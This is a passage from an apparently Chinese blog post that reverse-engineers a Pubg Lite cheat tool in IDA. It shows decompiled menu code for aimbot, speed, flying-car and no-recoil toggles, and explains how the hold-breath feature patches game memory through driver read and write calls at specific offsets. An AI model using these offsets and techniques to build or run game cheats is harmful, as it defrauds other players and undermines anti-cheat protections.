class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v14 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v14;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v64 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Line )</span><br><span class=\"line\">    v15 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v15 = (LPVOID)v64;</span><br><span class=\"line\">  v16 = v15;</span><br><span class=\"line\">  v17 = v76;</span><br><span class=\"line\">  v18 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v18, v17, v16);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Aim )</span><br><span class=\"line\">    v19 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v19 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;右键自瞄F4&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v19);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Aim )</span><br><span class=\"line\">    v20 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v20 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v20;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v65 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Aim )</span><br><span class=\"line\">    v21 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v21 = (LPVOID)v65;</span><br><span class=\"line\">  v22 = v21;</span><br><span class=\"line\">  v23 = v76;</span><br><span class=\"line\">  v24 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v24, v23, v22);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Breath )</span><br><span class=\"line\">    v25 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v25 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;开启屏息F5&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v25);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Breath )</span><br><span class=\"line\">    v26 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v26 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v26;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;               <span class=\"comment\">// v78=10.0f</span></span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v66 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_Breath )</span><br><span class=\"line\">    v27 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v27 = (LPVOID)v66;</span><br><span class=\"line\">  v28 = v27;</span><br><span class=\"line\">  v29 = v76;</span><br><span class=\"line\">  v30 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v30, v29, v28);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_HightJump )</span><br><span class=\"line\">    v31 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v31 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;人物高跳F6&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v31);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_HightJump )</span><br><span class=\"line\">    v32 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v32 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v32;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v67 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_HightJump )</span><br><span class=\"line\">    v33 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v33 = (LPVOID)v67;</span><br><span class=\"line\">  v34 = v33;</span><br><span class=\"line\">  v35 = v76;</span><br><span class=\"line\">  v36 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v36, v35, v34);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_CarFly )</span><br><span class=\"line\">    v37 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v37 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;车辆飞行F7&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v37);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_CarFly )</span><br><span class=\"line\">    v38 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v38 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v38;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_40D2AF</span>(<span class=\"number\">1</span>, dword_4DF3E8);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_40204B</span>((<span class=\"type\">char</span>)StrSwitch);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( lpMem[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(lpMem[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  v73 = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)v72 = v73 + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v68 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v61 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_CarFly )</span><br><span class=\"line\">    v39 = v68;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v39 = v61;</span><br><span class=\"line\">  v40 = v39;</span><br><span class=\"line\">  v41 = v76;</span><br><span class=\"line\">  v42 = <span class=\"built_in\">toInt64</span>(*(<span class=\"type\">double</span> *)v72);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(lpMem, v42, v41, v40);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( lpMem[<span class=\"number\">0</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(lpMem[<span class=\"number\">0</span>]);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_SuperSpeed )</span><br><span class=\"line\">    v43 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v43 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;人物加速F8&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v43);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_SuperSpeed )</span><br><span class=\"line\">    v44 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v44 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v44;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v69 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_SuperSpeed )</span><br><span class=\"line\">    v45 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v45 = (LPVOID)v69;</span><br><span class=\"line\">  v46 = v45;</span><br><span class=\"line\">  v47 = v76;</span><br><span class=\"line\">  v48 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v48, v47, v46);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_NoRecoil )</span><br><span class=\"line\">    v49 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v49 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;腰射午后F9&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v49);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_NoRecoil )</span><br><span class=\"line\">    v50 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v50 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v50;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v70 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_NoRecoil )</span><br><span class=\"line\">    v51 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v51 = (LPVOID)v70;</span><br><span class=\"line\">  v52 = v51;</span><br><span class=\"line\">  v53 = v76;</span><br><span class=\"line\">  v54 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v54, v53, v52);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">  v76 += <span class=\"number\">25</span>;</span><br><span class=\"line\">  StrSwitch = <span class=\"number\">0</span>;</span><br><span class=\"line\">  lpMem[<span class=\"number\">1</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  lpMem[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">HIDWORD</span>(v73) = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_AbsorbObject )</span><br><span class=\"line\">    v55 = lpMem[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v55 = (LPVOID)<span class=\"built_in\">HIDWORD</span>(v73);</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"string\">&quot;超级吸人F10&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;v72[<span class=\"number\">1</span>], v77, v76, v55);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v72[<span class=\"number\">1</span>] )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(v72[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_AbsorbObject )</span><br><span class=\"line\">    v56 = <span class=\"string\">&quot;开&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v56 = <span class=\"string\">&quot;关&quot;</span>;</span><br><span class=\"line\">  StrSwitch = v56;</span><br><span class=\"line\">  *(<span class=\"type\">double</span> *)lpMem = (<span class=\"type\">double</span>)v77;</span><br><span class=\"line\">  v73 = *(<span class=\"type\">double</span> *)lpMem + <span class=\"number\">75.0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v72[<span class=\"number\">0</span>] = (LPVOID)<span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v71 = <span class=\"built_in\">sub_4065DD</span>(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Switch_AbsorbObject )</span><br><span class=\"line\">    v57 = v72[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v57 = (LPVOID)v71;</span><br><span class=\"line\">  v58 = v57;</span><br><span class=\"line\">  v59 = v76;</span><br><span class=\"line\">  v60 = <span class=\"built_in\">toInt64</span>(v73);</span><br><span class=\"line\">  <span class=\"built_in\">DrawText</span>(&amp;StrSwitch, v60, v59, v58);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( StrSwitch )</span><br><span class=\"line\">    <span class=\"built_in\">FreeMem</span>(StrSwitch);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以看到，这部分只有绘制菜单的代码，而且每一个子菜单的代码部分都是基本相同。</p>\n<p>![Untitled%2012](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 12.png)</p>\n<p>这部分的<strong>if</strong>只是用来判断和显示功能是否打开，里面并未存在任何其他代码，说明真正的功能开关在别处，而且在功能开启时菜单的内容也有所改变，所以一定会修改到控制变量。我们直接在控制变量上按下<strong>X</strong>，看看哪里有对他赋值或者判断。<strong>（我这用内存屏息作为例子，因为涉及到透视的功能存在算法会稍微复杂）</strong></p>\n<p>![Untitled%2013](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 13.png)</p>\n<p>我们看到该处有多个交叉引用，我们发现后面三个都是在我们这一个函数内，所以不用看。主要就看前三个，第一个时进行判断，第二第三个存在于同一个函数内，而且时相邻代码，可以知道他这里是修改了该控制变量，我们直接跳过去看看。</p>\n<p>![Untitled%2014](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 14.png)</p>\n<p>我们发现这里面都是对所有功能的控制变量进行一个取反操作。那我们就知道这个函数只用于对控制变量的一个赋值，我们在函数头交叉引用看看。</p>\n<p>![Untitled%2015](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 15.png)</p>\n<p>发现还是来到这个地方，那么我们就已经分析出两个函数了。现在我们返回对控制变量的交叉引用，我们这次看cmp的那个语句。</p>\n<p>![Untitled%2016](..&#x2F;images&#x2F;GameHacker&#x2F;某Pubg%20Lite辅助逆向分析过程及心得&#x2F;Untitled 16.png)</p>\n<p>我们直接跳转到了这里，很显然这里基本上就是对功能的一个开关。他这里判断如果控制变量为&#x3D;1就执行。其实这里如果对易语言熟悉的人，脑海中基本可以浮现出这一段所对应易语言代码。</p>\n<p>他首先是对14D8这样一个临时进行一个十六进制到十进制的转换，然后对其临时字符串释放(这个也是我在本次逆向分析的时候学到的)。其实他这一句，可能就对应着易语言的<strong>进制_十六到十()<strong>的这个命令。继续转换之后就开始地址之间的加法，这里也要注意的是，由于程序位32位，游戏为64位，所以指针大小也不同</strong>(32位4字节，64位8字节)<strong>。Ida这里直接用double计算(一个double 8字节)，然后再转为int64也是我这次学到的。最后进行读写操作。这里他是驱动读写，并且在分析的时候发现如果是</strong>+44(十进制)<strong>那么就为</strong>读操作</strong>，如果是**+64(十进制)<strong>就为</strong>写操作**。大概了解之后，这个函数的代码基本就可以阅读完了。都是对地址+偏移后读，然后再内容。这里就顺便看一下他的屏息如何实现的。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( Switch_Breath == <span class=\"number\">1</span> )                     <span class=\"comment\">// 开启屏息</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    lpMem = <span class=\"string\">&quot;14D8&quot;</span>;</span><br><span class=\"line\">    v22 = <span class=\"built_in\">HexToDec</span>(&amp;lpMem);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( lpMem )</span><br><span class=\"line\">      <span class=\"built_in\">FreeMem</span>(lpMem);</span><br><span class=\"line\">    v21 = (<span class=\"type\">double</span>)MySelftAddr;</span><br><span class=\"line\">    v20 = (<span class=\"type\">double</span>)v22;</span><br><span class=\"line\">    v19 = v21 + v20;                            <span class=\"comment\">// 本人地址+0x14D8</span></span><br><span class=\"line\">    v0 = <span class=\"built_in\">toInt64</span>(v19);                          <span class=\"comment\">// 转成int64</span></span><br><span class=\"line\">    <span class=\"built_in\">LODWORD</span>(LayerOne) = (*(<span class=\"built_in\">int</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD))(*(_DWORD *)dword_4DF300 + <span class=\"number\">44</span>))(</span><br><span class=\"line\">                          &amp;dword_4DF300,</span><br><span class=\"line\">                          dword_4DF2F4,</span><br><span class=\"line\">                          v0,</span><br><span class=\"line\">                          <span class=\"built_in\">HIDWORD</span>(v0));         <span class=\"comment\">// 读一次</span></span><br><span class=\"line\">    v26 = LayerOne;</span><br><span class=\"line\">    lpMem = <span class=\"string\">&quot;458&quot;</span>;</span><br><span class=\"line\">    v22 = <span class=\"built_in\">HexToDec</span>(&amp;lpMem);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( lpMem )</span><br><span class=\"line\">      <span class=\"built_in\">FreeMem</span>(lpMem);</span><br><span class=\"line\">    v21 = (<span class=\"type\">double</span>)v26;</span><br><span class=\"line\">    v20 = (<span class=\"type\">double</span>)v22;</span><br><span class=\"line\">    v19 = v21 + v20;                            <span class=\"comment\">// 把读出来的内容再加上0x458,此时得到的这个地址为目标地址</span></span><br><span class=\"line\">    v26 = <span class=\"built_in\">toInt64</span>(v19);</span><br><span class=\"line\">    lpMem = &amp;v18;</span><br><span class=\"line\">    v2 = <span class=\"built_in\">sub_40D2C1</span>(<span class=\"number\">28</span>, <span class=\"number\">2</span>);                     <span class=\"comment\">// 不晓得干嘛</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( lpMem != &amp;v18 )</span><br><span class=\"line\">      <span class=\"built_in\">sub_40D2BB</span>((LPCSTR)<span class=\"number\">6</span>);</span><br><span class=\"line\">    <span class=\"built_in\">HIDWORD</span>(v21) = v2;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2 )</span><br><span class=\"line\">      (*(<span class=\"built_in\">void</span> (__stdcall **)(LPVOID *, <span class=\"type\">int</span>, _DWORD, _DWORD, _DWORD))(*(_DWORD *)dword_4DF300 + <span class=\"number\">64</span>))(</span><br><span class=\"line\">        &amp;dword_4DF300,</span><br><span class=\"line\">        